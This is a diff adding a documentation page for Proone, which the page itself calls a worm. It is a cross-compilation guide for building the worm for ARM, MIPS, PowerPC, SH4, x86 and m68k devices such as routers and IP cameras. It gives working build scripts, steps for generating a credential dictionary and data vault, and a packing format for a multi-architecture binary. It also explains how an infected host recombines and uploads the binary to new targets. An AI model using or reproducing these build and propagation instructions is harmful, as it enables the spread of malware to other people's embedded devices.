@@ -1,0 +1,437 @@
+---
+title: Cross-Compilation
+description: Build Proone for multiple target architectures and create multi-platform release packages
+---
+
+## Overview
+
+Proone is designed to target a wide range of embedded Linux devices with different CPU architectures. The project includes sophisticated build scripts that automate cross-compilation for multiple architectures and package them into a single deployable executable with a FatELF-style binary archive.
+
+## Cross-Compilation Workflow
+
+The cross-compilation process involves:
+
+1. Building native tools for the build host
+2. Cross-compiling the worm for each target architecture
+3. Stripping and extracting debug symbols
+4. Generating data vault and credential dictionaries
+5. Packing all binaries into a single multi-architecture executable
+
+## Prerequisites
+
+### Required Tool: xcomp
+
+The build scripts depend on the `xcomp` tool for managing cross-compilation environments. This tool must be installed and configured before running the build scripts.
+
+**Reference:** ~/workspace/source/scripts/build-all.sh:5
+
+### Cross-Compilation Toolchains
+
+Install cross-compilation toolchains for your target architectures:
+
+```bash
+# Example: Installing ARM and MIPS toolchains on Debian/Ubuntu
+sudo apt-get install \
+  gcc-arm-linux-gnueabi \
+  gcc-mips-linux-gnu \
+  gcc-mipsel-linux-gnu \
+  gcc-powerpc-linux-gnu \
+  gcc-sh4-linux-gnu \
+  gcc-m68k-linux-gnu
+```
+
+Each toolchain provides:
+- Cross-compiler (`<target>-gcc`)
+- Binutils (`<target>-objcopy`, `<target>-strip`, `<target>-readelf`)
+- Standard libraries for the target
+
+### Target Libraries
+
+All dependencies must be cross-compiled for each target architecture:
+- mbedtls (mbedcrypto, mbedx509, mbedtls)
+- libssh2
+- zlib
+- pthsem
+
+These libraries should be installed in the target sysroot or specified via `LDFLAGS`/`CPPFLAGS`.
+
+## Build Configuration
+
+Create a configuration file `scripts/build-all.conf.sh` to specify target architectures:
+
+```bash
+# Build configuration for build-all.sh
+# Each entry: "OS ARCH TARGET_PREFIX HOST COMPILER_PREFIX"
+
+BUILD_TARGETS=(
+  "linux armv4t armv4t arm-linux-gnueabi arm-linux-gnueabi"
+  "linux i686 i686 i686-linux-gnu i686-linux-gnu"
+  "linux mips mips mips-linux-gnu mips-linux-gnu"
+  "linux mpsl mipsel mipsel-linux-gnu mipsel-linux-gnu"
+  "linux ppc powerpc powerpc-linux-gnu powerpc-linux-gnu"
+  "linux sh4 sh4 sh4-linux-gnu sh4-linux-gnu"
+  "linux m68k m68k m68k-linux-gnu m68k-linux-gnu"
+)
+
+# Optional: Override default paths
+# PROONE_PREFIX="builds"
+# PROONE_DEBUG_SYM_DIR="builds/debug"
+# PROONE_EXEC_DIR="builds/proone.bin"
+# PROONE_TOOLS_DIR="builds/tools"
+
+# Optional: Pass additional configure flags
+# PROONE_AM_CONF="--enable-minmem"
+```
+
+**Target entry format:**
+- `OS` - Operating system (currently only "linux" supported)
+- `ARCH` - Architecture identifier for output files
+- `TARGET_PREFIX` - Target identifier used in file naming
+- `HOST` - Host triplet passed to `--host` in configure
+- `COMPILER_PREFIX` - Toolchain prefix for compiler/binutils
+
+**Source:** ~/workspace/source/scripts/build-all.sh:37-43, 111-116
+
+## Build Scripts
+
+### build-all.sh
+
+The main script that orchestrates the entire multi-architecture build process.
+
+**Location:** `scripts/build-all.sh`
+
+**Usage:**
+```bash
+# Must be run from project root with no arguments
+./scripts/build-all.sh
+```
+
+**What it does:**
+
+1. **Loads configuration** from `scripts/build-all.conf.sh`
+2. **Creates build directory structure:**
+   - `builds/` - Root build output directory
+   - `builds/debug/` - Debug symbol files
+   - `builds/proone.bin/` - Architecture-specific ELF files
+   - `builds/tools/` - Native build tools
+   - `builds/misc/` - Test utilities
+   - `builds/proone/` - Final multi-arch executables
+
+3. **Builds native tools** on the build host:
+   - proone-pack
+   - proone-list-arch
+   - proone-mkcdict
+   - proone-mkdvault
+   - proone-ipaddr-arr
+
+4. **Generates data vault** and credential dictionary:
+   ```bash
+   proone-mkcdict src/proone_conf/cred_dict.txt builds/cred_dict.bin
+   proone-mkdvault builds/cred_dict.bin > builds/dvault.bin
+   ```
+
+5. **Cross-compiles each target** using `xcomp` and `build-arch.sh`
+
+6. **Packs all executables** into final multi-architecture binary:
+   ```bash
+   proone-pack builds/proone/proone builds/dvault.bin builds/proone.bin/stripped.*
+   ```
+
+**Source:** ~/workspace/source/scripts/build-all.sh:1-124
+
+**Output Structure:**
+```
+builds/
+├── debug/
+│   ├── proone.sym.linux.armv4t
+│   ├── proone.sym.linux.i686
+│   └── ...
+├── proone.bin/
+│   ├── stripped.linux.armv4t
+│   ├── stripped.linux.i686
+│   ├── entire.linux.armv4t
+│   ├── readelf.linux.armv4t
+│   └── ...
+├── tools/
+│   ├── proone-pack
+│   ├── proone-mkcdict
+│   └── ...
+├── misc/
+│   ├── proone-stress.linux.armv4t
+│   └── ...
+├── proone/
+│   └── proone  # Final multi-arch executable
+├── cred_dict.bin
+└── dvault.bin
+```
+
+### build-arch.sh
+
+Builds Proone for a single target architecture.
+
+**Location:** `scripts/build-arch.sh`
+
+**Usage:**
+```bash
+# Set required environment variables
+export PROONE_BIN_OS="linux"
+export PROONE_BIN_ARCH="armv4t"
+export PROONE_HOST="arm-linux-gnueabi"
+export PROONE_EXEC_PREFIX="builds/proone.bin/stripped"
+export PROONE_ENTIRE_PREFIX="builds/proone.bin/entire"
+export PROONE_DEBUG_SYM_PREFIX="builds/debug/"
+export PROONE_READELF_PREFIX="builds/proone.bin/readelf"
+export PROONE_MISC_BIN_PREFIX="builds/misc/"
+
+# Run via xcomp (normally called by build-all.sh)
+xcomp <sysroot> <toolchain> scripts/build-arch.sh
+```
+
+**What it does:**
+
+1. **Configures** with cross-compilation settings:
+   ```bash
+   ./configure --host="$PROONE_HOST" --enable-static $PROONE_AM_CONF
+   ```
+
+2. **Compiles** core executable and test utilities:
+   ```bash
+   make -j$(nproc) proone.bin proone-stress proone-resolv proone-test_proto proone-test_util
+   ```
+
+3. **Separates debug symbols** using the `separate_debug` function:
+   - Copies unstripped executable
+   - Extracts debug symbols with `objcopy --only-keep-debug`
+   - Strips binary removing unnecessary sections
+   - Adds debug link with `objcopy --add-gnu-debuglink`
+   - Generates readelf output for analysis
+
+4. **Cleans up** for next architecture build
+
+**Source:** ~/workspace/source/scripts/build-arch.sh:1-82
+
+### separate_debug Function
+
+Extraction of debug symbols for post-mortem debugging:
+
+```bash
+separate_debug() {
+  # $1 = input executable
+  # $2 = stripped output for release
+  # $3 = debug symbols output
+  # $4 = optional entire copy with readelf dump
+  
+  cp -a "$1" "$2"
+  if [ ! -z "$4" ]; then
+    cp -a "$1" "$4"
+    "$PROONE_HOST"-readelf -a "$4" > "$READELF_PATH"
+  fi
+  
+  "$PROONE_HOST-objcopy" --only-keep-debug "$2" "$3"
+  "$PROONE_HOST-strip" \
+    -S \
+    --strip-unneeded \
+    --remove-section=.note.gnu.gold-version \
+    --remove-section=.comment \
+    --remove-section=.note \
+    --remove-section=.note.gnu.build-id \
+    --remove-section=.note.ABI-tag \
+    --remove-section=.jcr \
+    --remove-section=.got.plt \
+    --remove-section=.eh_frame \
+    --remove-section=.eh_frame_ptr \
+    --remove-section=.eh_frame_hdr \
+    "$2"
+  
+  "$PROONE_HOST-objcopy" --add-gnu-debuglink="$3" "$2"
+}
+```
+
+This aggressive stripping reduces binary size significantly by removing:
+- Build IDs and notes
+- Comments and version info
+- Exception handling frames
+- GOT/PLT sections (for static builds)
+
+**Source:** ~/workspace/source/scripts/build-arch.sh:36-59
+
+## Manual Cross-Compilation
+
+For building a single architecture manually:
+
+```bash
+# 1. Bootstrap
+./bootstrap.sh
+
+# 2. Configure for target
+./configure \
+  --host=arm-linux-gnueabi \
+  --enable-static \
+  CFLAGS="-Os -march=armv5te"
+
+# 3. Build
+make -j$(nproc)
+
+# 4. Strip binary
+arm-linux-gnueabi-strip -s src/proone.bin
+
+# 5. Generate data vault (using native tools)
+cd src
+./proone-mkcdict proone_conf/cred_dict.txt cred_dict.bin
+./proone-mkdvault cred_dict.bin > dvault.bin
+
+# 6. Append data vault
+cat proone.bin dvault.bin > proone
+chmod +x proone
+```
+
+## Binary Archive Format
+
+The final multi-architecture executable uses a custom FatELF-style format:
+
+```
+┌─────────────────────┐
+│  Native ELF header  │ ← Executable for build host architecture
+│   and code (.text)  │
+├─────────────────────┤
+│      DVault         │ ← Data vault (XOR-masked sensitive data)
+├─────────────────────┤
+│   BA Index          │ ← Binary Archive index (OS/arch → offset/size)
+├─────────────────────┤
+│   Compressed ELFs   │ ← All target architecture executables
+│   (zlib stream)     │   compressed into single stream
+│                     │
+│  - linux/armv4t     │
+│  - linux/i686       │
+│  - linux/mips       │
+│  - linux/mipsel     │
+│  - linux/ppc        │
+│  - linux/sh4        │
+│  - linux/m68k       │
+└─────────────────────┘
+```
+
+**Key features:**
+1. **Self-contained** - Single file contains all target binaries
+2. **Decentralized** - No binary distribution server needed
+3. **Compressed** - zlib compression reduces total size
+4. **Recombination** - Extracts and recombines for different targets
+
+See ~/workspace/source/doc/sws.md:153-237 for detailed binary archive and recombination documentation.
+
+## Binary Recombination
+
+When Proone infects a target with a different architecture:
+
+1. **Parses its own executable** to locate DVault and Binary Archive
+2. **Decompresses** the binary archive stream
+3. **Extracts** the ELF for the target architecture from the index
+4. **Appends** the DVault to the target ELF
+5. **Recompresses** the binary archive with the host ELF replacing target ELF
+6. **Uploads** the recombined executable to the target
+
+Example: linux/armv4t host infecting linux/sh4 target:
+
+```
+     Host (armv4t)                      Target (sh4)
+┌─────────────────┐              ┌─────────────────┐
+│ ELF armv4t      │              │ ELF sh4         │ ← Extracted from BA
+├─────────────────┤              ├─────────────────┤
+│ DVault          │─── copy ───→ │ DVault          │
+├─────────────────┤              ├─────────────────┤
+│ BA Index        │─── update ─→ │ BA Index        │
+├─────────────────┤              ├─────────────────┤
+│ sh4 (compress)  │─ decompress→ │ armv4t (recomp) │ ← Host replaces target
+│ i686 (keep)     │─ recompress→ │ i686 (keep)     │
+│ mips (keep)     │─ recompress→ │ mips (keep)     │
+└─────────────────┘              └─────────────────┘
+```
+
+**Source:** ~/workspace/source/doc/sws.md:188-233
+
+## Targeting Considerations
+
+### Wide Device Range
+
+Proone targets legacy devices running old Linux kernels:
+
+- **POSIX Standard:** `_POSIX_C_SOURCE=200112L` (POSIX.1-2001)
+- **Kernel Versions:** Tested on Linux 2.6.x and later
+- **Architecture:** Big-endian and little-endian variants
+- **Memory:** Designed for < 32MB RAM with `--enable-minmem`
+
+**Source:** ~/workspace/source/doc/sws.md:261-273
+
+### Common Target Architectures
+
+- **ARM** (armv4t, armv5te, armv7) - Routers, IoT devices, IP cameras
+- **MIPS/MIPSel** - Home routers, set-top boxes
+- **PowerPC** - Embedded systems, network appliances
+- **SH4** (SuperH) - Older consumer electronics
+- **x86** (i386, i686) - Legacy x86 embedded systems
+- **m68k** (Motorola 68000) - Industrial control systems
+
+### Static Linking Requirement
+
+Embedded devices rarely have:
+- Full library installations
+- Compatible library versions
+- Sufficient storage for dependencies
+
+Therefore, **`--enable-static` is essential** for cross-compiled releases.
+
+## Troubleshooting
+
+### xcomp Command Not Found
+
+```bash
+scripts/build-all.sh: line 116: xcomp: command not found
+```
+
+Install and configure the xcomp tool according to its documentation.
+
+### Cross-Compiler Not Found
+
+```bash
+configure: error: C compiler cannot create executables
+```
+
+Ensure the cross-compilation toolchain is installed and in your PATH.
+
+### Library Not Found During Cross-Compilation
+
+```bash
+configure: error: mbedtls not found
+```
+
+Cross-compile the required library for the target architecture and specify its location:
+
+```bash
+LDFLAGS="-L/path/to/target/libs" \
+CPPFLAGS="-I/path/to/target/includes" \
+./configure --host=<target-triplet> --enable-static
+```
+
+### Build Output Directory Issues
+
+If build-all.sh fails with permission or directory errors:
+
+```bash
+# Clean and retry
+rm -rf builds/
+./scripts/build-all.sh
+```
+
+## Best Practices
+
+1. **Always use static linking** for production cross-compilation
+2. **Keep debug symbols** in `builds/debug/` for analyzing crashes
+3. **Test on real target devices** before deployment
+4. **Use --enable-minmem** for very low-memory targets
+5. **Preserve readelf outputs** for reverse engineering analysis
+6. **Version control** your `build-all.conf.sh` configuration
+
+## Next Steps
+
+- Return to [Building Proone](/build/building) for standard build instructions
+- Review [Configuration Options](/build/configuration) for tuning cross-builds
